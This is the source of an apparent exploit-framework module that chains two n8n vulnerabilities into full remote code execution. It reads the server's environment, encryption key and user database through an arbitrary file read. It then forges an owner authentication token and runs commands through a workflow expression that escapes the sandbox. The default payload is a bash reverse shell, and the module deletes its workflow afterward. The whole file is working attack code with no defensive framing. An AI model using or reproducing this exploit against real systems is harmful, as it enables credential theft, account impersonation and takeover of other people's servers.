#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import hashlib
import json
import random
import secrets
import sqlite3
import tempfile
from base64 import b64encode

try:
	import jwt
except ImportError:
	jwt = None
	print_warning("PyJWT not installed. Install with: pip install PyJWT")

class Module(Exploit, Http_client):

	__info__ = {
		"name": "n8n Full Chain RCE (CVE-2026-21858 + CVE-2025-68613)",
		"description": "n8n Full Chain Exploit: Arbitrary File Read → Admin Token Forge → Sandbox Bypass → RCE",
		"author": "KittySploit Team",
		"cve": ["CVE-2026-21858", "CVE-2025-68613"],
		"references": [
			"https://github.com/Chocapikk/CVE-2026-21858"
		],
		"optional_dependencies": ["PyJWT"],
		"payload": {
			"default": "payloads/singles/cmd/unix/bash_reverse_tcp",
			"arch": "cmd",
			"platform": Platform.UNIX,
			"category": "singles"
		}
	}

	form_path = OptString("/form/upload", "Form upload path for LFI", required=True)

	def randpos(self) -> list:
		"""Generate random position for nodes"""
		return [random.randint(100, 599), random.randint(100, 599)]

	def _lfi_payload(self, filepath: str) -> dict:
		"""Create LFI payload for form upload"""
		return {
			"data": {},
			"files": {
				f"f-{self.random_text(6)}": {
					"filepath": filepath,
					"originalFilename": f"{self.random_text(8)}.bin",
					"mimetype": "application/octet-stream",
					"size": secrets.randbelow(90000) + 10000
				}
			}
		}

	def _build_nodes(self, command: str) -> tuple:
		"""Build workflow nodes for RCE"""
		# RCE payload template for n8n workflow execution
		rce_payload_template = '={{ (function() { var require = this.process.mainModule.require; var execSync = require("child_process").execSync; return execSync("CMD").toString(); })() }}'
		
		trigger_name, rce_name = f"T-{self.random_text(8)}", f"R-{self.random_text(8)}"
		result_var = f"v{self.random_text(6)}"
		payload_value = rce_payload_template.replace("CMD", command.replace('"', '\\"'))
		nodes = [
			{
				"parameters": {},
				"name": trigger_name,
				"type": "n8n-nodes-base.manualTrigger",
				"typeVersion": 1,
				"position": self.randpos(),
				"id": f"t-{self.random_text(12)}"
			},
			{
				"parameters": {
					"values": {
						"string": [{
							"name": result_var,
							"value": payload_value
						}]
					}
				},
				"name": rce_name,
				"type": "n8n-nodes-base.set",
				"typeVersion": 2,
				"position": self.randpos(),
				"id": f"r-{self.random_text(12)}"
			}
		]
		connections = {
			trigger_name: {
				"main": [[{"node": rce_name, "type": "main", "index": 0}]]
			}
		}
		return nodes, connections, trigger_name, rce_name

	def read_file(self, filepath: str, timeout: int = 30) -> bytes:
		"""Arbitrary File Read (CVE-2026-21858)"""
		# Get form_path value (handle both OptString and direct value)
		form_path_value = self.form_path.value if hasattr(self.form_path, 'value') else self.form_path
		form_path_value = form_path_value.lstrip('/')
		
		resp = self.http_request(
			method="POST",
			path=f"/{form_path_value}",
			json=self._lfi_payload(filepath),
			headers={"Content-Type": "application/json"},
			timeout=timeout,
			verify=False
		)
		if resp and resp.status_code == 200 and resp.content:
			return resp.content
		return None

	def get_version(self) -> tuple:
		"""Get n8n version and check if vulnerable"""
		resp = self.http_request(
			method="GET",
			path="/rest/settings",
			timeout=10,
			verify=False
		)
		if resp and resp.status_code == 200:
			try:
				data = resp.json().get("data", {})
				version = data.get("versionCli", "0.0.0")
				major, minor = map(int, version.split(".")[:2])
				return version, major < 1 or (major == 1 and minor < 121)
			except:
				pass
		return "0.0.0", False

	def get_home(self) -> str:
		"""Extract HOME directory from /proc/self/environ"""
		data = self.read_file("/proc/self/environ")
		if not data:
			return None
		for var in data.split(b"\x00"):
			if var.startswith(b"HOME="):
				return var.decode().split("=", 1)[1]
		return None

	def get_key(self, home: str) -> str:
		"""Extract encryption key from config"""
		data = self.read_file(f"{home}/.n8n/config")
		if not data:
			return None
		try:
			return json.loads(data).get("encryptionKey")
		except:
			return None

	def get_db(self, home: str) -> bytes:
		"""Download database file"""
		return self.read_file(f"{home}/.n8n/database.sqlite", timeout=120)

	def extract_admin(self, db: bytes) -> tuple:
		"""Extract admin user from database"""
		with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
			f.write(db)
			f.flush()
			try:
				conn = sqlite3.connect(f.name)
				row = conn.execute(
					"SELECT id, email, password FROM user WHERE role='global:owner' LIMIT 1"
				).fetchone()
				conn.close()
				return (row[0], row[1], row[2]) if row else None
			finally:
				import os
				try:
					os.unlink(f.name)
				except:
					pass

	def forge_token(self, key: str, uid: str, email: str, pw_hash: str) -> str:
		"""Forge admin authentication token"""
		if jwt is None:
			raise ImportError("PyJWT is required. Install with: pip install PyJWT")
		secret = hashlib.sha256(key[::2].encode()).hexdigest()
		h = b64encode(hashlib.sha256(f"{email}:{pw_hash}".encode()).digest()).decode()[:10]
		self.admin_token = jwt.encode({"id": uid, "hash": h}, secret, "HS256")
		return self.admin_token

	def verify_token(self) -> bool:
		"""Verify forged token works"""
		resp = self.http_request(
			method="GET",
			path="/rest/users",
			cookies={"n8n-auth": self.admin_token},
			timeout=10,
			verify=False
		)
		return resp is not None and resp.status_code == 200

	def rce(self, command: str) -> str:
		"""Execute RCE via workflow (CVE-2025-68613)"""
		nodes, connections, _, _ = self._build_nodes(command)
		wf_name = f"wf-{self.random_text(16)}"
		workflow = {
			"name": wf_name,
			"active": False,
			"nodes": nodes,
			"connections": connections,
			"settings": {}
		}

		resp = self.http_request(
			method="POST",
			path="/rest/workflows",
			json=workflow,
			cookies={"n8n-auth": self.admin_token},
			timeout=10,
			verify=False
		)
		if not resp or resp.status_code != 200:
			return None
		
		try:
			wf_id = resp.json().get("data", {}).get("id")
		except:
			return None
		
		if not wf_id:
			return None

		run_data = {
			"workflowData": {
				"id": wf_id,
				"name": wf_name,
				"active": False,
				"nodes": nodes,
				"connections": connections,
				"settings": {}
			}
		}
		resp = self.http_request(
			method="POST",
			path=f"/rest/workflows/{wf_id}/run",
			json=run_data,
			cookies={"n8n-auth": self.admin_token},
			timeout=30,
			verify=False
		)
		if not resp or resp.status_code != 200:
			self.http_request(
				method="DELETE",
				path=f"/rest/workflows/{wf_id}",
				cookies={"n8n-auth": self.admin_token},
				timeout=5,
				verify=False
			)
			return None

		try:
			exec_id = resp.json().get("data", {}).get("executionId")
		except:
			exec_id = None
		
		result = self._get_result(exec_id) if exec_id else None
		self.http_request(
			method="DELETE",
			path=f"/rest/workflows/{wf_id}",
			cookies={"n8n-auth": self.admin_token},
			timeout=5,
			verify=False
		)
		return result

	def _get_result(self, exec_id: str) -> str:
		"""Get execution result"""
		resp = self.http_request(
			method="GET",
			path=f"/rest/executions/{exec_id}",
			cookies={"n8n-auth": self.admin_token},
			timeout=10,
			verify=False
		)
		if not resp or resp.status_code != 200:
			return None
		
		try:
			data = resp.json().get("data", {}).get("data")
			if not data:
				return None
			parsed = json.loads(data)
			# Result is usually the last non-empty string
			for item in reversed(parsed):
				if isinstance(item, str) and len(item) > 3 and item not in ("success", "error"):
					return item.strip()
		except:
			pass
		return None

	def _generate_payload_command(self) -> str:
		"""Generate payload command from payload module"""
		try:
			from core.utils.function import pythonize_path
			import importlib
			
			# Get payload path
			payload_path = self.payload.value if hasattr(self.payload, 'value') else str(self.payload)
			if not payload_path:
				fail.Message("No payload configured")
				return None
			
			payload_path_normalized = pythonize_path(payload_path)
			module_path = ".".join(("modules", payload_path_normalized))
			payload_module = getattr(importlib.import_module(module_path), "Module")()
			
			# Set framework reference
			if self.framework:
				payload_module.framework = self.framework
			
			# Copy payload options if they exist
			if hasattr(self, 'lhost') and hasattr(payload_module, 'lhost'):
				if hasattr(self.lhost, 'value'):
					payload_module.lhost.value = self.lhost.value
				else:
					payload_module.lhost = self.lhost
			if hasattr(self, 'lport') and hasattr(payload_module, 'lport'):
				if hasattr(self.lport, 'value'):
					payload_module.lport.value = self.lport.value
				else:
					payload_module.lport = self.lport
			
			# Generate the payload command
			return payload_module.generate()
		except Exception as e:
			print_error(f"Failed to generate payload: {e}")
			return None

	def run(self):
		"""Main exploit chain"""
		self.admin_token = None
		
		# Check version
		print_status("Checking n8n version...")
		version, vuln = self.get_version()
		print_info(f"Version: {version} ({'VULNERABLE' if vuln else 'UNKNOWN'})")
		
		# Step 1: Arbitrary File Read - Get HOME directory
		print_status("Step 1: Reading /proc/self/environ to get HOME directory...")
		home = self.get_home()
		if not home:
			print_error("Failed to extract HOME directory")
			self.not_vulnerable()
			return False
		print_success(f"HOME directory: {home}")
		
		# Step 2: Read encryption key
		print_status("Step 2: Reading encryption key from config...")
		key = self.get_key(home)
		if not key:
			print_error("Failed to read encryption key")
			self.not_vulnerable()
			return False
		print_success(f"Encryption key: {key[:8]}...")
		
		# Step 3: Download database
		print_status("Step 3: Downloading database file...")
		db = self.get_db(home)
		if not db:
			print_error("Failed to download database")
			self.not_vulnerable()
			return False
		print_success(f"Database downloaded: {len(db)} bytes")
		
		# Step 4: Extract admin user
		print_status("Step 4: Extracting admin user from database...")
		admin = self.extract_admin(db)
		if not admin:
			print_error("Failed to extract admin user")
			self.not_vulnerable()
			return False
		uid, email, pw = admin
		print_success(f"Admin user found: {email}")
		
		# Step 5: Forge token
		print_status("Step 5: Forging admin authentication token...")
		self.forge_token(key, uid, email, pw)
		print_success("Token forged successfully")
		
		# Step 6: Verify token
		print_status("Step 6: Verifying admin access...")
		if not self.verify_token():
			print_error("Token verification failed")
			self.not_vulnerable()
			return False
		print_success("Admin access GRANTED!")
		print_info(f"Cookie: n8n-auth={self.admin_token}")
		
		# Step 7: Generate and execute payload via RCE
		print_status("Step 7: Generating payload command...")
		payload_cmd = self._generate_payload_command()
		if not payload_cmd:
			print_error("Failed to generate payload command")
			self.not_vulnerable()
			return False
		
		print_status("Step 8: Executing payload via RCE...")
		result = self.rce(payload_cmd)
		if result:
			print_success("Command executed successfully")
			if result.strip():
				print_info(f"Output: {result}")
			self.vulnerable()
			return True
		else:
			print_error("RCE execution failed")
			self.not_vulnerable()
			return False
